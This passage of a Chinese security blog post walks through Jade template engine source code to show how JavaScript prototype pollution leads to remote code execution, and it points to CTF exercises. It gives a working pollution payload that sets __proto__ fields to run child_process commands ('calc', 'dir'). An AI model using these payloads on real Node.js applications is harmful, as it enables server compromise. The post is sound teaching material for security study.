+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">8888</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> port = server.<span class="title function_">address</span>().<span class="property">port</span></span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;测试环境，访问地址为 http://127.0.0.1:%s&quot;</span>, port)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>打好断点后我们启动调试，访问8888端口后开始执行渲染</p>
+<p><img src="/../image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250601185730273.png" alt="image-20250601185730273"></p>
+<p>单步执行跳到render渲染点</p>
+<p><img src="/../image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250601190154163.png" alt="image-20250601190154163"></p>
+<p>然后跟进执行看一下<code>__express</code></p>
+<p><img src="/../image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250601185556995.png" alt="image-20250601185556995"></p>
+<p>此时会进入renderFile函数，我们跟进看一下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">renderFile</span> = <span class="keyword">function</span>(<span class="params">path, options, fn</span>)&#123;</span><br><span class="line">  <span class="comment">// support callback API</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="string">&#x27;function&#x27;</span> == <span class="keyword">typeof</span> options) &#123;</span><br><span class="line">    fn = options, options = <span class="literal">undefined</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> fn === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> res</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      res = <span class="built_in">exports</span>.<span class="title function_">renderFile</span>(path, options);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ex) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">fn</span>(ex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">fn</span>(<span class="literal">null</span>, res);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  options = options || &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  options.<span class="property">filename</span> = path;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">handleTemplateCache</span>(options)(options);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>最后会返回handleTemplateCache函数的执行结果，跟进一下</p>
+<p><img src="/../image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250601190333837.png" alt="image-20250601190333837"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">handleTemplateCache</span> (<span class="params">options, str</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> key = options.<span class="property">filename</span>;</span><br><span class="line">  <span class="keyword">if</span> (options.<span class="property">cache</span> &amp;&amp; <span class="built_in">exports</span>.<span class="property">cache</span>[key]) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">exports</span>.<span class="property">cache</span>[key];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (str === <span class="literal">undefined</span>) str = fs.<span class="title function_">readFileSync</span>(options.<span class="property">filename</span>, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> templ = <span class="built_in">exports</span>.<span class="title function_">compile</span>(str, options);</span><br><span class="line">    <span class="keyword">if</span> (options.<span class="property">cache</span>) <span class="built_in">exports</span>.<span class="property">cache</span>[key] = templ;</span><br><span class="line">    <span class="keyword">return</span> templ;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的话会返回templ参数的结果，而这个参数来源于compile方法，我们跟进一下</p>
+<p><img src="/../image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250601152406070.png" alt="image-20250601152406070"></p>
+<p>我们挨个打断点看看哪里出问题，先看第一个红框</p>
+<p>这里会先进入parse函数</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">parse</span>(<span class="params">str, options</span>)&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (options.<span class="property">lexer</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&#x27;Using `lexer` as a local in render() is deprecated and &#x27;</span></span><br><span class="line">               + <span class="string">&#x27;will be interpreted as an option in Jade 2.0.0&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Parse</span></span><br><span class="line">  <span class="keyword">var</span> parser = <span class="title function_">new</span> (options.<span class="property">parser</span> || <span class="title class_">Parser</span>)(str, options.<span class="property">filename</span>, options);</span><br><span class="line">  <span class="keyword">var</span> tokens;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// Parse</span></span><br><span class="line">    tokens = parser.<span class="title function_">parse</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    parser = parser.<span class="title function_">context</span>();</span><br><span class="line">    runtime.<span class="title function_">rethrow</span>(err, parser.<span class="property">filename</span>, parser.<span class="property">lexer</span>.<span class="property">lineno</span>, parser.<span class="property">input</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Compile</span></span><br><span class="line">  <span class="keyword">var</span> compiler = <span class="title function_">new</span> (options.<span class="property">compiler</span> || <span class="title class_">Compiler</span>)(tokens, options);</span><br><span class="line">  <span class="keyword">var</span> js;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    js = compiler.<span class="title function_">compile</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="keyword">if</span> (err.<span class="property">line</span> &amp;&amp; (err.<span class="property">filename</span> || !options.<span class="property">filename</span>)) &#123;</span><br><span class="line">      runtime.<span class="title function_">rethrow</span>(err, err.<span class="property">filename</span>, err.<span class="property">line</span>, parser.<span class="property">input</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (err <span class="keyword">instanceof</span> <span class="title class_">Error</span>) &#123;</span><br><span class="line">        err.<span class="property">message</span> += <span class="string">&#x27;\n\nPlease report this entire error and stack trace to https://github.com/jadejs/jade/issues&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">throw</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Debug compiler</span></span><br><span class="line">  <span class="keyword">if</span> (options.<span class="property">debug</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;\nCompiled Function:\n\n\u001b[90m%s\u001b[0m&#x27;</span>, js.<span class="title function_">replace</span>(<span class="regexp">/^/gm</span>, <span class="string">&#x27;  &#x27;</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> globals = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (options.<span class="property">globals</span>) &#123;</span><br><span class="line">    globals = options.<span class="property">globals</span>.<span class="title function_">slice</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  globals.<span class="title function_">push</span>(<span class="string">&#x27;jade&#x27;</span>);</span><br><span class="line">  globals.<span class="title function_">push</span>(<span class="string">&#x27;jade_mixins&#x27;</span>);</span><br><span class="line">  globals.<span class="title function_">push</span>(<span class="string">&#x27;jade_interp&#x27;</span>);</span><br><span class="line">  globals.<span class="title function_">push</span>(<span class="string">&#x27;jade_debug&#x27;</span>);</span><br><span class="line">  globals.<span class="title function_">push</span>(<span class="string">&#x27;buf&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> body = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    + <span class="string">&#x27;var buf = [];\n&#x27;</span></span><br><span class="line">    + <span class="string">&#x27;var jade_mixins = &#123;&#125;;\n&#x27;</span></span><br><span class="line">    + <span class="string">&#x27;var jade_interp;\n&#x27;</span></span><br><span class="line">    + (options.<span class="property">self</span></span><br><span class="line">      ? <span class="string">&#x27;var self = locals || &#123;&#125;;\n&#x27;</span> + js</span><br><span class="line">      : <span class="title function_">addWith</span>(<span class="string">&#x27;locals || &#123;&#125;&#x27;</span>, <span class="string">&#x27;\n&#x27;</span> + js, globals)) + <span class="string">&#x27;;&#x27;</span></span><br><span class="line">    + <span class="string">&#x27;return buf.join(&quot;&quot;);&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> &#123;<span class="attr">body</span>: body, <span class="attr">dependencies</span>: parser.<span class="property">dependencies</span>&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250601193142087.png" alt="image-20250601193142087"></p>
+<p>其实parse函数主要是执行这两步，主要是负责将模板字符串转换为可执行的 JavaScript 代码，一个是解析字符串，一个是转化成js代码</p>
+<p>最后返回的东西</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> body = <span class="string">&#x27;&#x27;</span></span><br><span class="line">   + <span class="string">&#x27;var buf = [];\n&#x27;</span></span><br><span class="line">   + <span class="string">&#x27;var jade_mixins = &#123;&#125;;\n&#x27;</span></span><br><span class="line">   + <span class="string">&#x27;var jade_interp;\n&#x27;</span></span><br><span class="line">   + (options.<span class="property">self</span></span><br><span class="line">     ? <span class="string">&#x27;var self = locals || &#123;&#125;;\n&#x27;</span> + js</span><br><span class="line">     : <span class="title function_">addWith</span>(<span class="string">&#x27;locals || &#123;&#125;&#x27;</span>, <span class="string">&#x27;\n&#x27;</span> + js, globals)) + <span class="string">&#x27;;&#x27;</span></span><br><span class="line">   + <span class="string">&#x27;return buf.join(&quot;&quot;);&#x27;</span>;</span><br><span class="line"> <span class="keyword">return</span> &#123;<span class="attr">body</span>: body, <span class="attr">dependencies</span>: parser.<span class="property">dependencies</span>&#125;;</span><br></pre></td></tr></table></figure>
+
+<p><code>options.self</code> 可控, 可以绕过 <code>addWith</code> 函数, 回头跟进 compile 函数</p>
+<p><img src="/../image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250601194027274.png" alt="image-20250601194027274"></p>
+<p>返回的是 buf, 跟进 visit 函数</p>
+<p><img src="/../image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250601194148290.png" alt="image-20250601194148290"></p>
+<p>这里有对debug的赋值，如果debug为true就进入push，这里有拼接语句，我们看看这两个参数是否可控</p>
+<p><strong>node.line</strong>和<strong>node.filename</strong>在 debug 为真的时候进入了 buf。然而<strong>node.filename</strong>被<strong>utils.stringify</strong>处理过了，无法逃逸双引号。唯有考虑 line 是否可以被覆盖了。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jade_debug.<span class="title function_">unshift</span>(<span class="keyword">new</span> jade.<span class="title class_">DebugItem</span>( <span class="number">0</span>, <span class="string">&quot;&quot;</span> ));<span class="keyword">return</span> <span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;dir&#x27;</span>);<span class="comment">//</span></span><br></pre></td></tr></table></figure>
+
+<p>最后还会执行visitNode函数</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">visitNode</span>: <span class="keyword">function</span>(<span class="params">node</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>[<span class="string">&#x27;visit&#x27;</span> + node.<span class="property">type</span>](node);&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们type可以动态调用函数，测试结果如下</p>
+<table>
+<thead>
+<tr>
+<th>Method Name</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>visitAttributes</td>
+<td></td>
+</tr>
+<tr>
+<td>visitBlock</td>
+<td></td>
+</tr>
+<tr>
+<td>visitBlockComment</td>
+<td>√</td>
+</tr>
+<tr>
+<td>visitCase</td>
+<td></td>
+</tr>
+<tr>
+<td>visitCode</td>
+<td>√</td>
+</tr>
+<tr>
+<td>visitComment</td>
+<td>√</td>
+</tr>
+<tr>
+<td>visitDoctype</td>
+<td></td>
+</tr>
+<tr>
+<td>visitEach</td>
+<td></td>
+</tr>
+<tr>
+<td>visitFilter</td>
+<td></td>
+</tr>
+<tr>
+<td>visitMixin</td>
+<td></td>
+</tr>
+<tr>
+<td>visitMixinBlock</td>
+<td>√</td>
+</tr>
+<tr>
+<td>visitNode</td>
+<td></td>
+</tr>
+<tr>
+<td>visitLiteral</td>
+<td></td>
+</tr>
+<tr>
+<td>visitText</td>
+<td></td>
+</tr>
+<tr>
+<td>visitTag</td>
+<td></td>
+</tr>
+<tr>
+<td>visitWhen</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>所以最终得到链子，首先就是先覆盖debug的值使其进入push语句，然后通过构造line的值为我们的恶意代码，最后将type设置为code就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Code&quot;,&quot;compileDebug&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>哦对了，还有一个self参数，需要进行设置就会跳过</p>
+<p>针对 jade RCE链的污染, 普通的模板可以只需要污染 self 和 line, 但是有继承的模板还需要污染 type，绕过addWith的报错</p>
+<h2 id="0x03题目"><a href="#0x03题目" class="headerlink" title="0x03题目"></a>0x03题目</h2><p>在ctfshowweb入门里面的nodejs就有几道js原型链污染的题目</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">A6out</a></li>
+        
+          <li><a href="/tags/">T6gs</a></li>
+        
+          <li><a href="/categories/">Catagory</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">s4arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">0x01继承与原型链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">4.</span> <span class="toc-text">0x02攻击原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#proto-%E5%92%8Cprototype"><span class="toc-number">4.1.</span> <span class="toc-text">__proto__和prototype</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%9A%84%E7%BB%A7%E6%89%BF%E6%9C%BA%E5%88%B6"><span class="toc-number">4.2.</span> <span class="toc-text">基于原型链的继承机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">4.3.</span> <span class="toc-text">原型链污染是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-number">4.4.</span> <span class="toc-text">污染的条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">4.5.</span> <span class="toc-text">不同对象的原型链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ejs%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%AF%BC%E8%87%B4RCE"><span class="toc-number">5.</span> <span class="toc-text">ejs模板引擎原型链污染导致RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E6%8E%A5%E8%BF%91%E7%9C%9F%E7%9B%B8"><span class="toc-number">5.1.</span> <span class="toc-text">源码分析&amp;接近真相</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jade%E6%A8%A1%E6%9D%BF%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%AF%BC%E8%87%B4RCE"><span class="toc-number">6.</span> <span class="toc-text">jade模板原型链污染导致RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%E9%A2%98%E7%9B%AE"><span class="toc-number">7.</span> <span class="toc-text">0x03题目</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/05/29/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/05/29/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&text=js原型链污染"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/05/29/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&title=js原型链污染"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/05/29/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&is_video=false&description=js原型链污染"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=js原型链污染&body=Check out this article: https://wanth3f1ag.top/2025/05/29/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/05/29/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&title=js原型链污染"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/05/29/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&title=js原型链污染"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/05/29/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&title=js原型链污染"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/05/29/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&title=js原型链污染"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/05/29/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&name=js原型链污染&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/05/29/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&t=js原型链污染"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        wanTh3flag
+        <br>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">A6out</a></li><!--
+                --><!--
+                --><li><a href="/tags/">T6gs</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Catagory</a></li><!--
+                --><!--
+                --><li><a href="/links/">L1nks</a></li><!--
+                --><!--
+                --><li><a href="/search/">s4arch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
